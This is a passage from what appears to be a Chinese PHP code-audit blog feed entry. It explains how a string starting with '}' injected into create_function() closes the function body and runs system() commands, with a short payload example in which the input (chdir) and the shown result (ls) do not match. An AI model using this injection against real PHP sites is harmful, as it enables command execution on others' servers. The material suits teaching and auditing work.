开头的字符串时，<code>eval()</code> 会认为当前的函数体已经结束，然后执行后面的代码。例如，以下代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$func</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#125;system(&quot;chdir&quot;);//&#x27;</span>);</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>create_function()</code> 会创建一个如下的函数：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">&#125;<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="comment">//&#x27;</span></span><br></pre></td></tr></table></figure><p>这个函数的主体是空的，然后执行 <code>system(&quot;ls&quot;);</code>。</p><p><code>//</code> 在这里的作用是防止 <code>&quot;&#125;system(&#39;chdir&#39;);&quot;</code> 被完整解析，导致语法错误。也可以使用 <code>#</code> 或 <code>&#123;</code> 来达到同样的效果</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="PHP代码审计" scheme="http://example.com/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHP常见函数" scheme="http://example.com/tags/PHP%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0/"/>
    
  </entry>
  
</feed>
